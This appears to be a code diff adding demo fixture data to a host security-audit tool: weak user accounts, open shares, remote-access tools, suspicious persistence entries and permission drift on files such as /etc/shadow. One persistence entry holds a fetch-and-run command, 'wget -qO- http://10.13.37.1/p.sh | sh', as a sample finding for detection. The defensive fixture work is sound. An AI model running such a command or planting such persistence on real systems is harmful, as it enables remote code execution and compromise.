@@ -50,6 +50,7 @@ export const demoUsers: UserRecord[] = [
     locked: false,
     passwordEmpty: false,
     passwordSet: true,
+    passwordNeverExpires: true,
   }),
   linuxUser({
     name: "coach",
@@ -141,6 +142,7 @@ export const demoUsers: UserRecord[] = [
     locked: false,
     passwordEmpty: true,
     passwordSet: false,
+    passwordNeverExpires: true,
   }),
   linuxUser({
     name: "nologin_admin",
@@ -219,6 +221,7 @@ export const demoUsers: UserRecord[] = [
     enabled: true,
     passwordEmpty: true,
     passwordSet: false,
+    passwordNeverExpires: true,
   }),
   winUser({
     name: "alice",
@@ -366,3 +369,42 @@ export const demoSysctl = {
   "kernel.randomize_va_space": "2",
   "kernel.dmesg_restrict": "0",
 };
+
+export const demoExpectedPorts = [
+  { protocol: "tcp" as const, port: 22 },
+  { protocol: "tcp" as const, port: 80 },
+  { protocol: "tcp" as const, port: 443 },
+];
+
+export const demoShareAcls = [
+  { name: "public", path: "/srv/public", principal: "Everyone", rights: "Full", guest: true, writable: true },
+  { name: "C$", path: "C:\\", principal: "Everyone", rights: "Read", guest: false, writable: true },
+  { name: "homes", path: "/home", principal: "alice", rights: "Read", guest: false, writable: false },
+];
+
+export const demoRemoteTools = [
+  { name: "teamviewer", kind: "package", path: "/usr/bin/teamviewer" },
+  { name: "anydesk", kind: "package", path: "/usr/bin/anydesk" },
+  { name: "x11vnc", kind: "binary", path: "/usr/bin/x11vnc" },
+];
+
+export const demoBrowserExtensions = [
+  { browser: "chrome", id: "abcdefghijklmnopqrstuvwxyzabcdef", profile: "/home/bob/.config/google-chrome/Default/Extensions" },
+  { browser: "firefox", id: "hacker@evil", profile: "/home/flag/.mozilla/firefox/abcd.default/extensions" },
+];
+
+export const demoPersistence = [
+  { source: "rc.local", payload: "/tmp/.kworker", suspicious: true },
+  { source: "cron.d", payload: "wget -qO- http://10.13.37.1/p.sh | sh", suspicious: true },
+  { source: "profile.d", payload: "/etc/profile.d/backdoor.sh", suspicious: true },
+  { source: "HKCU\\Run", payload: "C:\\Users\\alice\\AppData\\Roaming\\update.exe", suspicious: true },
+  { source: "systemd", payload: "sshd.service", suspicious: false },
+];
+
+export const demoPermDrift = [
+  { path: "/etc/shadow", mode: "0644", expected: "0640", drift: true },
+  { path: "/etc/gshadow", mode: "0644", expected: "0640", drift: true },
+  { path: "/etc/sudoers", mode: "0666", expected: "0440", drift: true },
+  { path: "/etc/ssh/ssh_host_rsa_key", mode: "0644", expected: "0600", drift: true },
+  { path: "C:\\Windows\\System32\\config\\SAM", mode: "Everyone:(R)", expected: "SYSTEM/Administrators only", drift: true },
+];
